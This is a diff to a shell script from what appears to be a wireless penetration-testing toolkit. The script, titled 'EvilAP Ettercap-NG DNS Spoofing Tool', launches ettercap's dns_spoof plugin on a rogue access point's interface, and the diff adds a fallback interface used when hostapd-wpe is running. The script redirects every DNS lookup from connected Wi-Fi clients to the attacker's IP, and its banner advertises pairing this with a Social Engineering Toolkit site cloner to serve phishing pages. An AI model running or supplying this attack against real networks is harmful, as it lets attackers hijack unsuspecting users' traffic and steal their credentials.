@@ -7,12 +7,9 @@ clear
 
 . /opt/pwnix/pwnpad-scripts/px_functions.sh
 
-if loud_one=1 f_validate_one at0; then
-
 f_banner(){
   printf "\nEvilAP Ettercap-NG DNS Spoofing Tool\n\n"
   printf "[!] This only works when EvilAP is running!\n"
-  printf "[!] Monitor mode (at0) must be active!\n\n"
   printf "[-] All DNS requests from wireless clients connected to EvilAP will be redirected to IP of EvilAP (192.168.7.1)\n\n"
   printf "[+] Use with Social Engineering Toolkit\n"
   printf "[-] (site cloner uses 192.168.7.1)\n\n"
@@ -22,10 +19,20 @@ f_run(){
   f_banner
 
   #ettercap fails if the interface is down
-  ip link set at0 up
+  ip link set ${evilap_eth} up
 
-  ettercap -i at0 -T -q -P dns_spoof
+  ettercap -i ${evilap_eth} -T -q -P dns_spoof
 }
 
-f_run
+if loud_one=1 f_validate_one at0; then
+  evilap_eth="at0"
 fi
+if f_validate_one wlan1; then
+  if pgrep hostapd-wpe; then
+    #this clear removes the noise from the at0 check
+    clear
+    evilap_eth="wlan1"
+  fi
+fi
+
+[ -n "${evilap_eth}" ] && f_run
